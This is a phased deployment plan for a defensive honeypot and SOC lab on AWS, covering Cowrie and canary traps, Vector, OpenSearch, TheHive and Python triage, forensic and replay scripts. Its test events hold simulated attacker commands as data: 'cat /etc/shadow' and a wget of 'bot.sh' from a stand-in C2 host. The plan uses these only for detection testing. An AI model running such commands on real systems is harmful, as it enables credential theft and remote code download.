# Project Chronos: Phased Implementation Plan

> **Document Version**: 2.0.0
> **Execution Mode**: Step-by-step manual execution guide for Elroy Tay
> **Target Platform**: AWS (`chronos-sensor` t4g.micro + `chronos-soc-core` m7i-flex.large)
> **Workspace Path**: `docs/plan.md`

---

## 1. Plan Overview

This plan targets the two-node AWS cloud topology defined in [`docs/scope.md`](scope.md). All heavy SOC workloads run on `chronos-soc-core` in the cloud; the analyst workstation is a thin client connecting via SSM port-forwarding only.

```
Phase 1: SOC Core — OpenSearch + Vector Aggregator
   │
   ▼
Phase 2: SOC Core — SOAR (TheHive 5 + Cortex) & Forensic Automation
   │
   ▼
Phase 3: Edge Sensor — Honeypot Deployment & Hypervisor Hardening
   │
   ▼
Phase 4: End-to-End Integration & Pipeline Validation
   │
   ▼
Phase 5: Metrics Benchmarking & Portfolio Showcase
```

All shell commands prefixed `[sensor]` run on `chronos-sensor`; those prefixed `[core]` run on `chronos-soc-core`; `[mac]` run on the analyst workstation.

---

## 2. Component Status & Transition Notes

| Existing Component | Current State | Target State | Action |
| :--- | :--- | :--- | :--- |
| **`docker-compose.yml`** | Monolithic compose file (all services together). | Split: `docker-compose.core.yml` on `chronos-soc-core`, `docker-compose.edge.yml` on `chronos-sensor`. | Refactor — honeypot decoys on sensor, SIEM/SOAR on core. |
| **`config/vector/vector.yaml`** | Simple local file-tail without network ingestion. | Two configs: `vector-edge.yaml` (tail → TCP 9002) and `vector-core.yaml` (TCP 9002 → OpenSearch). | Split into two purpose-built configs. |
| **`responders/tarpit_responder.py`** | Bare `match_all` script printing to stdout. | `scripts/triage-automation.py` and `scripts/dfir-tools.py` with full TheHive REST API integration. | Replace with formal automation scripts. |
| **`honeypots/canary_http/`** | Canary HTTP trap (Flask). | Deployed on `chronos-sensor` via `docker-compose.edge.yml`. | No code change required; wire into edge compose. |
| **`logs/`** | Local sample logs (cowrie, canary). | Logs live on `chronos-sensor`; streamed to `chronos-soc-core` by Vector in real time. | Used for local replay harness testing only. |
| **`README.md`** | Earlier conceptual notes, local M3 Air scope. | Reflects two-node cloud architecture. | ✅ Updated. |
| **`docs/architecture.md`** | 5-zone local + WireGuard + Home Assistant topology. | Two-node AWS topology with SSM access. | ✅ Updated. |

---

## Phase 1: SOC Core — OpenSearch + Vector Aggregator

### Objective
Stand up the OpenSearch 2.11+ SIEM cluster and Vector aggregator on `chronos-soc-core` with strict memory limits, validate ingestion via local sample logs.

### Step 1.1: Connect to SOC Core via SSM
```bash
# [mac]
aws ssm start-session --target i-073658c52d98d9975
```

### Step 1.2: Install Docker on SOC Core (Ubuntu 24.04)
```bash
# [core]
sudo apt-get update
sudo apt-get install -y docker.io docker-compose-plugin
sudo usermod -aG docker $USER
newgrp docker
docker info | grep -E "Server Version|Operating System|Total Memory"
```

### Step 1.3: Prepare Workspace & Directory Structure
```bash
# [core]
mkdir -p ~/chronos/{config/vector,config/opensearch,data/opensearch,logs/cowrie,logs/canary,scripts}
```

### Step 1.4: Create `docker-compose.core.yml`
```yaml
# ~/chronos/docker-compose.core.yml
version: '3.8'

networks:
  chronos_mesh:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16

services:
  opensearch:
    image: opensearchproject/opensearch:2.11.1
    container_name: chronos-opensearch
    environment:
      - cluster.name=chronos-cluster
      - node.name=chronos-core-01
      - discovery.type=single-node
      - bootstrap.memory_lock=true
      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
      - DISABLE_SECURITY_PLUGIN=true
      - DISABLE_INSTALL_DEMO_CONFIG=true
    ulimits:
      memlock:
        soft: -1
        hard: -1
      nofile:
        soft: 65536
        hard: 65536
    mem_limit: 1500m
    volumes:
      - ./data/opensearch:/usr/share/opensearch/data
    ports:
      - "127.0.0.1:9200:9200"
    networks:
      - chronos_mesh
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9200/_cat/health"]
      interval: 10s
      timeout: 5s
      retries: 5

  opensearch-dashboards:
    image: opensearchproject/opensearch-dashboards:2.11.1
    container_name: chronos-dashboards
    environment:
      - 'OPENSEARCH_HOSTS=["http://opensearch:9200"]'
      - DISABLE_SECURITY_DASHBOARDS_PLUGIN=true
    mem_limit: 600m
    ports:
      - "127.0.0.1:5601:5601"
    networks:
      - chronos_mesh
    depends_on:
      opensearch:
        condition: service_healthy

  vector-core:
    image: timberio/vector:0.34.X-alpine
    container_name: chronos-vector-core
    mem_limit: 300m
    volumes:
      - ./config/vector/vector-core.yaml:/etc/vector/vector.yaml:ro
      - ./logs:/var/log/chronos:ro
    ports:
      - "0.0.0.0:9002:9002"   # Inbound telemetry from chronos-sensor (SG-restricted)
      - "127.0.0.1:8686:8686" # Vector GraphQL API (internal only)
    networks:
      - chronos_mesh
    depends_on:
      opensearch:
        condition: service_healthy
```

### Step 1.5: Create `config/vector/vector-core.yaml`
```yaml
sources:
  # Inbound network stream from chronos-sensor (Security Group restricted to sensor SG)
  edge_stream:
    type: vector
    address: 0.0.0.0:9002

  # Local file ingestion for replay harness testing
  replay_logs:
    type: file
    include:
      - /var/log/chronos/cowrie/*.json
      - /var/log/chronos/canary/*.json
    read_from: beginning

transforms:
  normalize_events:
    type: remap
    inputs:
      - edge_stream
      - replay_logs
    source: |
      # Parse JSON if raw string
      if exists(.message) {
        parsed, err = parse_json(.message)
        if err == null {
          . = merge(., parsed)
        }
      }

      # Standardize timestamp
      .timestamp = .timestamp ?? now()

      # Severity scoring (Tiers 1-5) & MITRE ATT&CK tagging
      .severity = 1
      .mitre_technique = "None"

      if .eventid == "cowrie.session.connect" {
        .severity = 2
        .event_description = "Inbound SSH Connection"
        .mitre_technique = "T1595.001"
      } else if .eventid == "cowrie.login.failed" {
        .severity = 3
        .event_description = "SSH Credential Brute-Force Attempt"
        .mitre_technique = "T1110.001"
      } else if .eventid == "cowrie.login.success" {
        .severity = 4
        .event_description = "Successful SSH Honeypot Login"
        .mitre_technique = "T1078.003"
      } else if .eventid == "cowrie.command.input" {
        .severity = 5
        .event_description = "Adversary Shell Command Execution"
        .mitre_technique = "T1059.004"
      } else if .eventid == "cowrie.session.file_download" {
        .severity = 5
        .event_description = "Adversary Tool Download Staging"
        .mitre_technique = "T1105"
      } else if .event_type == "canary_http_hit" {
        .severity = 2
        .mitre_technique = "T1595.002"
        if contains(string!(.path), "admin") || contains(string!(.path), "config") {
          .severity = 3
          .mitre_technique = "T1190"
        }
      }

sinks:
  opensearch_sink:
    type: elasticsearch
    inputs:
      - normalize_events
    endpoints:
      - "http://opensearch:9200"
    mode: bulk
    bulk:
      index: "chronos-logs-%Y.%m.%d"
    suppress_type_name: true
```

### Step 1.6: Launch Core SIEM Stack
```bash
# [core]
docker compose -f ~/chronos/docker-compose.core.yml up -d
docker stats --no-stream --format "table {{.Name}}\t{{.MemUsage}}\t{{.MemPerc}}"
```

#### Verification Gate 1
```bash
# [core]

# 1. OpenSearch cluster health
curl -s http://localhost:9200/_cluster/health | jq .status
# Expected: "green" or "yellow"

# 2. Simulate a Cowrie event and query
echo '{"eventid":"cowrie.command.input","src_ip":"198.51.100.23","input":"cat /etc/shadow","timestamp":"2026-09-18T12:00:00Z"}' \
  >> ~/chronos/logs/cowrie/test.json
sleep 3
curl -s "http://localhost:9200/chronos-logs-*/_search?q=eventid:cowrie.command.input" \
  | jq '.hits.total.value, .hits.hits[0]._source.severity, .hits.hits[0]._source.mitre_technique'
# Expected:
# >= 1
# 5
# "T1059.004"
```

---

## Phase 2: SOC Core — SOAR & Forensic Automation

### Objective
Deploy TheHive 5.2 + Cortex 3.1.1 with strict memory limits, configure NIST SP 800-61 case templates, and implement the triage and forensic automation scripts.

### Step 2.1: Add TheHive & Cortex to Core Compose
Append to `docker-compose.core.yml` under `services:`:
```yaml
  thehive:
    image: strangebee/thehive:5.2
    container_name: chronos-thehive
    depends_on:
      opensearch:
        condition: service_healthy
    command:
      - --secret
      - "${THEHIVE_SECRET_KEY}"
      - --db-janusgraph-storage-backend
      - berkeleydb
      - --db-janusgraph-storage-directory
      - /opt/thp/thehive/data/db
      - --index-backend-search-engine
      - opensearch
      - --index-backend-search-nodes
      - "opensearch:9200"
    mem_limit: 1800m
    ports:
      - "127.0.0.1:9000:9000"
    networks:
      - chronos_mesh

  cortex:
    image: strangebee/cortex:3.1.1
    container_name: chronos-cortex
    environment:
      - SECRET_KEY=${CORTEX_SECRET_KEY}
    mem_limit: 1200m
    ports:
      - "127.0.0.1:9001:9001"
    networks:
      - chronos_mesh
```

Create `~/chronos/.env`:
```bash
THEHIVE_SECRET_KEY=<generate-with-openssl-rand-hex-32>
CORTEX_SECRET_KEY=<generate-with-openssl-rand-hex-32>
```

### Step 2.2: Implement `scripts/triage-automation.py`
```python
#!/usr/bin/env python3
"""
triage-automation.py - Chronos SOAR Triage Automation Engine

Polls OpenSearch for severity >= 4 detections, de-duplicates events,
extracts observables, and auto-creates structured NIST SP 800-61 cases
in TheHive 5.
"""
import time
import json
import hashlib
import requests

OPENSEARCH_HOST = "http://localhost:9200"
THEHIVE_HOST = "http://localhost:9000"
THEHIVE_API_KEY = "YOUR_THEHIVE_API_KEY"

# De-duplication cache: hash -> timestamp
SEEN_ALERTS: dict[str, float] = {}
DEDUP_WINDOW_SECONDS = 600  # 10-minute suppression window

def get_high_severity_alerts() -> list[dict]:
    query = {
        "size": 20,
        "query": {"range": {"severity": {"gte": 4}}},
        "sort": [{"timestamp": {"order": "desc"}}],
    }
    try:
        res = requests.post(
            f"{OPENSEARCH_HOST}/chronos-logs-*/_search",
            json=query,
            timeout=5,
        )
        if res.status_code == 200:
            return res.json().get("hits", {}).get("hits", [])
    except Exception as e:
        print(f"[-] OpenSearch query error: {e}")
    return []

def is_duplicate(src_ip: str, event_id: str, command: str = "") -> bool:
    key = hashlib.sha256(f"{src_ip}:{event_id}:{command}".encode()).hexdigest()
    now = time.time()
    if key in SEEN_ALERTS and (now - SEEN_ALERTS[key]) < DEDUP_WINDOW_SECONDS:
        return True
    SEEN_ALERTS[key] = now
    return False

def create_thehive_case(event_source: dict) -> None:
    src_ip = event_source.get("src_ip", "0.0.0.0")
    event_id = event_source.get("eventid", "unknown")
    mitre_tech = event_source.get("mitre_technique", "T1059")
    command = event_source.get("input", "")
    desc = event_source.get("event_description", "High Severity Honeypot Hit")

    if is_duplicate(src_ip, event_id, command):
        print(f"[*] Suppressing duplicate alert for {src_ip} ({event_id})")
        return

    mtta_start = time.time()

    payload = {
        "title": f"[CHRONOS-ALERT] {desc} from {src_ip} ({mitre_tech})",
        "description": (
            f"Automated SOAR Qualification:\n"
            f"- Source IP: {src_ip}\n"
            f"- MITRE Technique: {mitre_tech}\n"
            f"- Command: `{command}`"
        ),
        "severity": event_source.get("severity", 4),
        "tags": ["Chronos", mitre_tech, "Automated-Triage"],
        "flag": True,
        "tlp": 2,
        "pap": 2,
    }
    headers = {
        "Authorization": f"Bearer {THEHIVE_API_KEY}",
        "Content-Type": "application/json",
    }

    print(f"[+] Dispatching case to TheHive: {payload['title']}")
    resp = requests.post(
        f"{THEHIVE_HOST}/api/v1/case", json=payload, headers=headers, timeout=5
    )
    mtta_ms = round((time.time() - mtta_start) * 1000, 1)
    print(f"[+] Case created in {mtta_ms} ms (HTTP {resp.status_code})")

if __name__ == "__main__":
    print("[*] Chronos Triage Automation — polling OpenSearch...")
    for alert in get_high_severity_alerts():
        create_thehive_case(alert.get("_source", {}))
```

### Step 2.3: Implement `scripts/dfir-tools.py`
```python
#!/usr/bin/env python3
"""
dfir-tools.py - Chronos Digital Forensics & Artifact Extraction Engine

Parses Cowrie binary ttylog files into readable ASCII transcripts and
computes SHA256 hashes for staged malware payloads.
"""
import sys
import hashlib
import struct
from pathlib import Path


def parse_ttylog(filepath: str) -> str:
    """
    Parses Cowrie binary ttylog files (format: sec, usec, length, data).
    Returns a human-readable terminal session transcript.
    """
    path = Path(filepath)
    if not path.exists():
        return f"[-] File not found: {filepath}"

    transcript: list[str] = []
    with open(path, "rb") as f:
        while True:
            header = f.read(16)
            if len(header) < 16:
                break
            sec, usec, length = struct.unpack("<III", header[:12])
            data = f.read(length)
            try:
                transcript.append(data.decode("utf-8", errors="replace"))
            except Exception:
                pass

    return "".join(transcript)


def hash_payload(filepath: str) -> str | None:
    """Computes SHA256 of a downloaded malware payload."""
    path = Path(filepath)
    if not path.exists():
        return None
    sha = hashlib.sha256()
    with open(path, "rb") as f:
        while chunk := f.read(8192):
            sha.update(chunk)
    return sha.hexdigest()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: dfir-tools.py [--parse-ttylog <file> | --hash <file>]")
        sys.exit(1)

    mode, target = sys.argv[1], sys.argv[2]

    if mode == "--parse-ttylog":
        print(f"[*] Reconstructing session: {target}")
        print(parse_ttylog(target))
    elif mode == "--hash":
        result = hash_payload(target)
        print(f"[*] SHA256 ({target}): {result}")
    else:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
```

#### Verification Gate 2
```bash
# [core]

# 1. TheHive responds
curl -s -o /dev/null -w "%{http_code}" http://localhost:9000/api/status
# Expected: 200 or 401 (auth required)

# 2. Run triage automation
python3 ~/chronos/scripts/triage-automation.py
# Expected: "[+] Dispatching case to TheHive: [CHRONOS-ALERT] Adversary Shell..."

# 3. Test forensic hasher
python3 ~/chronos/scripts/dfir-tools.py --hash /etc/hosts
# Expected: valid 64-char SHA256 hex string
```

---

## Phase 3: Edge Sensor — Honeypot Deployment & Hypervisor Hardening

### Objective
Deploy honeypot containers on `chronos-sensor`, shift host `sshd` to port 22222, enforce Security Group rules, and stream telemetry to `chronos-soc-core`.

### Step 3.1: Connect to Edge Sensor via SSM
```bash
# [mac]
aws ssm start-session --target i-024b46954f573b978
```

### Step 3.2: Shift Host sshd to Port 22222
```bash
# [sensor]
sudo sed -i 's/^#Port 22$/Port 22222/' /etc/ssh/sshd_config
sudo systemctl restart sshd
# Cowrie will now bind port 22 cleanly
```

### Step 3.3: Install Docker on Sensor
```bash
# [sensor] (Amazon Linux 2023)
sudo dnf install -y docker
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
newgrp docker
```

### Step 3.4: Deploy Edge Containers (`docker-compose.edge.yml`)
```yaml
# ~/chronos/docker-compose.edge.yml
version: '3.8'

services:
  cowrie:
    image: cowrie/cowrie:latest
    container_name: chronos-edge-cowrie
    restart: always
    ports:
      - "22:2222"
      - "23:2223"
    volumes:
      - ./logs/cowrie:/cowrie/cowrie-git/var/log/cowrie
      - ./logs/ttylog:/cowrie/cowrie-git/var/log/cowrie/tty

  canary_http:
    build:
      context: ./honeypots/canary_http
    container_name: chronos-edge-canary
    restart: always
    ports:
      - "80:8080"
    volumes:
      - ./logs/canary:/app/logs

  vector-edge:
    image: timberio/vector:0.34.X-alpine
    container_name: chronos-edge-vector
    restart: always
    volumes:
      - ./config/vector/vector-edge.yaml:/etc/vector/vector.yaml:ro
      - ./logs:/var/log/chronos:ro
    network_mode: host
```

### Step 3.5: Create `config/vector/vector-edge.yaml`
```yaml
sources:
  cowrie_logs:
    type: file
    include:
      - /var/log/chronos/cowrie/cowrie.json*
    read_from: end

  canary_logs:
    type: file
    include:
      - /var/log/chronos/canary/*.json
    read_from: end

transforms:
  tag_sensor:
    type: remap
    inputs:
      - cowrie_logs
      - canary_logs
    source: |
      .sensor_id = "aws-edge-t4g-01"
      .cloud_region = "us-east-1"

sinks:
  to_soc_core:
    type: vector
    inputs:
      - tag_sensor
    address: "<chronos-soc-core-private-ip>:9002"
```

### Step 3.6: Hypervisor Security Group Verification
Confirm the following rules are in place in the AWS Console / CLI:

**`chronos-sensor-sg` Inbound:**
| Port | Protocol | Source | Purpose |
| :--- | :--- | :--- | :--- |
| 22 | TCP | `0.0.0.0/0` | Cowrie SSH bait |
| 80 | TCP | `0.0.0.0/0` | Canary HTTP bait |

**`chronos-soc-sg` Inbound:**
| Port | Protocol | Source | Purpose |
| :--- | :--- | :--- | :--- |
| 9002 | TCP | `chronos-sensor-sg` (SG reference) | Telemetry ingestion only |

> [!IMPORTANT]
> `chronos-soc-core` must have **zero** other inbound rules from `0.0.0.0/0`. This is the primary blast-radius containment control.

#### Verification Gate 3
```bash
# [sensor]

# 1. Verify Cowrie binds port 22
ss -tlnp | grep 22
# Expected: 0.0.0.0:22 (Docker / Cowrie)

# 2. Verify SSH bait responds
# [mac] — from your workstation
ssh -p 22 root@<sensor-public-ip>
# Expected: Cowrie "svr04" banner / password prompt

# 3. Verify probe reaches Canary
curl -s http://<sensor-public-ip>/admin
# Expected: Fake 403 Forbidden (logged in canary_access.json)
```

---

## Phase 4: End-to-End Integration & Pipeline Validation

### Objective
Validate the full telemetry pipeline from `chronos-sensor` → port 9002 → `chronos-soc-core` → OpenSearch → triage automation → TheHive case creation.

### Step 4.1: Launch Edge Stack on Sensor
```bash
# [sensor]
docker compose -f ~/chronos/docker-compose.edge.yml up -d
docker logs -f chronos-edge-vector
# Expected: "Sending batch to chronos-soc-core:9002"
```

### Step 4.2: Monitor Ingestion on SOC Core
```bash
# [core]
docker logs -f chronos-vector-core
# Expected: Events arriving and being indexed into OpenSearch
```

#### Verification Gate 4
```bash
# [core]

# 1. Trigger an HTTP probe from the internet (or from mac via curl)
# [mac]
curl -s http://<sensor-public-ip>/admin/test
sleep 5

# 2. Query OpenSearch for the canary hit
# [core]
curl -s "http://localhost:9200/chronos-logs-*/_search?q=path:admin/test" \
  | jq '.hits.total.value, .hits.hits[0]._source.mitre_technique'
# Expected:
# >= 1
# "T1190"

# 3. Run triage automation to dispatch to TheHive
python3 ~/chronos/scripts/triage-automation.py
# Expected: Case created in TheHive for Severity >= 4 events

# 4. Open TheHive via SSM tunnel to verify
# [mac]
aws ssm start-session \
  --target i-073658c52d98d9975 \
  --document-name AWS-StartPortForwardingSession \
  --parameters '{"portNumber":["9000"],"localPortNumber":["9000"]}'
# Access http://localhost:9000 → verify case appears in TheHive
```

---

## Phase 5: Metrics Benchmarking & Portfolio Showcase

### Objective
Quantify MTTD/MTTA improvements using a replay harness, build OpenSearch Dashboards visualizations, and package forensic case studies.

### Step 5.1: Implement `scripts/replay-harness.py`
```python
#!/usr/bin/env python3
"""
replay-harness.py - Attack Simulation & Benchmark Testing Harness

Injects simulated multi-stage attack events into the Vector log stream
to benchmark MTTD and MTTA without relying on live internet traffic.
"""
import time
import json

LOG_PATH = "logs/cowrie/replay.json"

ATTACK_SCENARIOS = [
    {"eventid": "cowrie.session.connect", "src_ip": "198.51.100.55"},
    {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.55", "username": "root", "password": "admin123"},
    {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.55", "username": "root", "password": "password"},
    {"eventid": "cowrie.login.success", "src_ip": "198.51.100.55", "username": "admin"},
    {"eventid": "cowrie.command.input", "src_ip": "198.51.100.55", "input": "uname -a"},
    {"eventid": "cowrie.command.input", "src_ip": "198.51.100.55", "input": "wget http://c2.evil.example/bot.sh"},
    {"eventid": "cowrie.session.file_download", "src_ip": "198.51.100.55", "url": "http://c2.evil.example/bot.sh"},
]

def run_benchmark(speed: float = 1.0) -> None:
    print(f"[*] Starting Attack Simulation Replay (speed={speed}x)...")
    start = time.time()
    with open(LOG_PATH, "a") as f:
        for event in ATTACK_SCENARIOS:
            event["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            f.write(json.dumps(event) + "\n")
            f.flush()
            time.sleep(0.5 / speed)
    print(f"[+] Replay complete in {round(time.time() - start, 2)} s. Check OpenSearch for indexed events.")

if __name__ == "__main__":
    run_benchmark()
```

### Step 5.2: Build OpenSearch Dashboards
Access via SSM tunnel (`http://localhost:5601`) and build:

1. **Index Pattern**: `chronos-logs-*` (time field: `timestamp`)
2. **Visualizations**:
   - **Metric** — Average MTTA (time from `timestamp` to `triage_timestamp`)
   - **Pie Chart** — Alert distribution by Severity Tier (1–5)
   - **Data Table** — Top MITRE ATT&CK Techniques
   - **Horizontal Bar** — Top 10 attacked usernames & attacker ASNs
   - **World Map (GeoIP)** — Attack origin heatmap

#### Verification Gate 5 & Final Acceptance
```bash
# [core]

# 1. Run the benchmark replay
python3 ~/chronos/scripts/replay-harness.py

# 2. Verify events are indexed with correct severity
curl -s "http://localhost:9200/chronos-logs-*/_search?q=src_ip:198.51.100.55" \
  | jq '.hits.total.value'
# Expected: 7 events

# 3. Run triage automation on replayed batch
python3 ~/chronos/scripts/triage-automation.py
# Expected: Case dispatched to TheHive for Severity 4 (login.success) and Severity 5 (command.input) events

# 4. Confirm in TheHive via SSM tunnel
# [mac]
aws ssm start-session \
  --target i-073658c52d98d9975 \
  --document-name AWS-StartPortForwardingSession \
  --parameters '{"portNumber":["9000"],"localPortNumber":["9000"]}'
# Navigate to http://localhost:9000 — cases should be visible with MITRE tags
```

---

## 6. Troubleshooting & Failure Modes

| Issue / Symptom | Probable Cause | Diagnostic Command | Remediation |
| :--- | :--- | :--- | :--- |
| **OpenSearch fails (Exit 137)** | OOM killed — heap misconfigured. | `docker inspect chronos-opensearch --format '{{.State.OOMKilled}}'` | Verify `-Xms1g -Xmx1g` in compose and that instance has enough free RAM. |
| **Port 9002 not receiving events** | Security Group not permitting `chronos-sensor-sg` → port 9002. | `[sensor] nc -zv <soc-core-private-ip> 9002` | Add inbound rule: TCP 9002 from `chronos-sensor-sg` on `chronos-soc-sg`. |
| **Cowrie not binding port 22** | Host sshd still on port 22. | `[sensor] ss -tlnp \| grep 22` | Re-run Step 3.2 (shift host sshd to 22222 and restart sshd). |
| **AWS SSM session drops** | HTTPS 443 outbound accidentally blocked. | Check SG outbound rules for port 443. | Ensure TCP 443 outbound to AWS SSM IP ranges is explicitly permitted. |
| **TheHive JanusGraph init failure** | BerkeleyDB lock from crashed container. | `docker logs chronos-thehive` | Stop container; remove `*.lock` files in BerkeleyDB data dir; restart. |
| **Vector drops events (schema mismatch)** | Malformed JSON line in log file. | `docker logs chronos-vector-core` | Use defensive VRL: `parsed, err = parse_json(.message)`. |
| **Edge Vector can't reach SOC core** | Wrong private IP in `vector-edge.yaml`. | `[sensor] ping <soc-core-private-ip>` | Update `address` field in `vector-edge.yaml` with correct private IP. |
